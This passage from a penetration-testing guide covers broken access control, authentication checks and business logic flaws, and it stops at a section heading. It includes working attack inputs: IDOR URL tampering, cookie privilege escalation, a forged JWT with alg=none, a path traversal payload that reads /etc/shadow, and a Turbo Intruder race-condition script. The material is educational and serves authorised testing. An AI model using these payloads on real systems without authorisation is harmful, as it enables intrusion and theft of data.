7.1 A01 — Broken Access Control — Real Examples

# ❶ IDOR (Insecure Direct Object Reference)
# Normal: /api/users/1234/profile  → returns YOUR profile
# IDOR:   /api/users/1235/profile  → returns SOMEONE ELSE'S profile

# Test cycle:
# - Create User A and User B with our own creds
# - Note User A's order URL: /api/orders/ORD-9001
# - Replace with Ord-9000, 9002, etc.
# - 200 OK + different data = IDOR vuln

# ❷ Privilege escalation by parameter tampering
# URL: /admin/dashboard   →  403
# Hmm, change cookie group: "user" → "admin"
# Now: /admin/dashboard  →  200 OK

# ❸ JWT alg=none bypass (CRITICAL CLASSIC)
# Original JWT:
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature
# Replace header: 
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0 . eyJ1c2VyIjoiYWRtaW4ifQ.
# (empty signature) — server MUST accept!

# ❹ Path traversal
# /download?file=report.pdf              ← legit
# /download?file=../../../../etc/shadow  ← read shadow file
⚠ Found in 94% of applications tested. This is the bread & butter of every pentester. Always test access controls early in the engagement.

9.1 Authentication Test Checklist

  • Does password complexity apply?
  • Is there rate-limiting on login?
  • Can I enumerate users via response timing / message change?

🧠 Chapter 13 — Business Logic Vulnerabilities

The hardest to find — no scanner finds them. They require understanding business.

13.1 Common Logic Flaws Checklist

  • Negative quantity allowed in cart
  • Price modified client-side before checkout
  • Coupon applied after discount = double discount
  • Race condition in balance transfer (parallel requests)
  • Workflow skip — go directly to /thank-you without /payment
  • Currency confusion — INR vs USD decimals
  • Time-of-check vs Time-of-use (TOCTOU)
  • File upload accepts .exe (then re-interpreted by Apache)
  • Email change doesn't require re-authentication
  • Account deletion doesn't delete owned data
  • Search returns more rows than user has access to
  • Stripe webhooks signed but verify signature not enforced

13.2 Race Condition — Modern Pentest Staple

# Bank transfer $100 from account A to external account B.
# Server: read balance, check, write new balance.
# Race condition: send 10 transfer requests in parallel.
# If server reads balance once and writes 10 times with same logic,
# Balance might go negative!

# Tool: Turbo Intruder in Burp

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=50,
                           requestsPerConnection=1,
                           pipeline=False)
    for i in range(50):
        engine.queue(target.req, target.baseInput)
    engine.openGate()

13.3 Real-Life Scenario: E-Commerce Race Condition
